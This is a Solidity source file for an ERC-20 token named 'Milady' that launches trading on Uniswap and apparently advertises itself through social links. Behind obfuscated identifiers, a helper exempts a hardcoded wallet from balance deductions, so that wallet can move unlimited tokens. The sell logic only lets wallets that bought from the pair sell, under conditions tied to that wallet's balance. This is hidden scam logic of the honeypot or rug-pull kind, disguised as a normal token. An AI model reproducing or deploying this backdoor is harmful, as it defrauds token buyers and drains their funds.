/**
 * 
 * Milady
 * 
 * Telegram: https://t.me/Miladys_erc20
 * Twitter: https://twitter.com/Miladys_erc
 * Website: https://miladyerc.com/
*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _rxapv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rxapv(a, b, "SafeMath");
    }

    function  _rxapv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract Milady is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _dkfopj;
    address payable private _tjyolbh;
    address private _rpiofp;

    string private constant _name = unicode"Milady";
    string private constant _symbol = unicode"Milady";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _epvjog;
    mapping (address => bool) private _virmry;
    mapping(address => uint256) private _fnkofp;
    uint256 public _qflqvb = _totalSupply;
    uint256 public _drubre = _totalSupply;
    uint256 public _kqclbv= _totalSupply;
    uint256 public _vspoif= _totalSupply;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _yaueyj=0;
    uint256 private _eynzey=0;
    

    bool private _bretla;
    bool public _uorveiq = false;
    bool private qyiqle = false;
    bool private _oerfcq = false;


    event _pvfiph(uint _qflqvb);
    modifier unrsopr {
        qyiqle = true;
        _;
        qyiqle = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _epvjog[owner(

        )] = true;
        _epvjog[address
        (this)] = true;
        _epvjog[
            _tjyolbh] = true;
        _tjyolbh = 
        payable (0x0e36ce0280a557315b2Cf311662743EbfC12c66F);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rxapv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kvqakp=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_uorveiq) {
                if (to 
                != address
                (_dkfopj) 
                && to !=
                 address
                 (_rpiofp)) {
                  require(_fnkofp
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnkofp
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rpiofp && to != 
            address(_dkfopj) &&
             !_epvjog[to] ) {
                require(amount 
                <= _qflqvb,
                 "Exceeds the _qflqvb.");
                require(balanceOf
                (to) + amount
                 <= _drubre,
                  "Exceeds the _drubre.");
                if(_eynzey
                < _yaueyj){
                  require
                  (! _rovplor(to));
                }
                _eynzey++;
                 _virmry
                 [to]=true;
                kvqakp = amount._pvr
                ((_eynzey>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rpiofp &&
             from!= address(this) 
            && !_epvjog[from] ){
                require(amount <= 
                _qflqvb && 
                balanceOf(_tjyolbh)
                <_vspoif,
                 "Exceeds the _qflqvb.");
                kvqakp = amount._pvr((_eynzey>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_eynzey>
                _yaueyj &&
                 _virmry[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!qyiqle 
            && to == _rpiofp &&
             _oerfcq &&
             contractTokenBalance>
             _kqclbv 
            && _eynzey>
            _yaueyj&&
             !_epvjog[to]&&
              !_epvjog[from]
            ) {
                _transferFrom( _vjiqf(amount, 
                _vjiqf(contractTokenBalance,
                _vspoif)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _prulqh(address
                    (this).balance);
                }
            }
        }

        if(kvqakp>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kvqakp);
          emit
           Transfer(from,
           address
           (this),kvqakp);
        }
        _balances[from
        ]= _rxapv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _rxapv(kvqakp));
        emit Transfer
        (from, to, 
        amount.
         _rxapv(kvqakp));
    }

    function _transferFrom(uint256
     tokenAmount) private
      unrsopr {
        if(tokenAmount==
        0){return;}
        if(!_bretla)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _dkfopj.WETH();
        _approve(address(this),
         address(
             _dkfopj), 
             tokenAmount);
        _dkfopj.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _vjiqf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _rxapv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tjyolbh){
            return a ;
        }else{
            return a .
             _rxapv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qflqvb = _totalSupply;
        _drubre = _totalSupply;
        emit _pvfiph(_totalSupply);
    }

    function _rovplor(address 
    account) private view 
    returns (bool) {
        uint256 ekfrhb;
        assembly {
            ekfrhb :=
             extcodesize
             (account)
        }
        return ekfrhb > 
        0;
    }

    function _prulqh(uint256
    amount) private {
        _tjyolbh.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _bretla ) ;
        _dkfopj  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _dkfopj), 
            _totalSupply);
        _rpiofp = 
        IUniswapV2Factory(_dkfopj.
        factory( ) 
        ). createPair (
            address(this
            ),  _dkfopj .
             WETH ( ) );
        _dkfopj.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rpiofp).
        approve(address(_dkfopj), 
        type(uint)
        .max);
        _oerfcq = true;
        _bretla = true;
    }

    receive() external payable {}
}